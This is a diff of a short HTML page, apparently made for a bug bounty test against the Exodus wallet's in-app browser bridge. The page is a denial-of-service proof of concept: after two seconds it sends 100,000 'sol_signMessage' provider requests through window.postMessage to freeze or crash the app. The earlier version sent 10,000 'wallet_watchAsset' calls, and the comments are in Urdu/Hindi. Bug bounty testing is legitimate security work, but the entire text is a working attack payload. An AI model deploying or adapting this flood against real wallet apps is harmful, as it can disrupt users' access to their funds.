@@ -1,32 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exodus Bug Bounty Test</title>
-</head>
-<body>
+<body style="background-color: white; text-align: center; padding-top: 50px;">
     <h1>Testing Bridge Stability...</h1>
-    <p>Check if the app lags or crashes.</p>
-
+    <p>Flood starting in 2 seconds...</p>
     <script>
-        // Flood loop: 10,000 messages bhejte hain
-        function triggerFlood() {
-            console.log("Starting Bridge Flood...");
-            for (let i = 0; i < 10000; i++) {
-                // Hum postMessage use kar rahe hain jo humne code mein dekha tha
+        setTimeout(() => {
+            // Humne tadaad 100,000 kar di hai taake crash confirm ho
+            for (let i = 0; i < 100000; i++) {
                 window.postMessage({
                     target: "provider",
-                    data: { 
-                        method: "wallet_watchAsset", // Fake method
-                        id: i,
-                        params: { type: "ERC20", options: { address: "0x..." } }
-                    }
+                    data: { method: "sol_signMessage", params: ["Flood Test"] }
                 }, "*");
             }
-            alert("Flood Completed. Did it crash?");
-        }
-
-        // 2 seconds baad start karega
-        setTimeout(triggerFlood, 2000);
+            alert("Flood Completed! Check if app is frozen.");
+        }, 2000);
     </script>
 </body>
 </html>
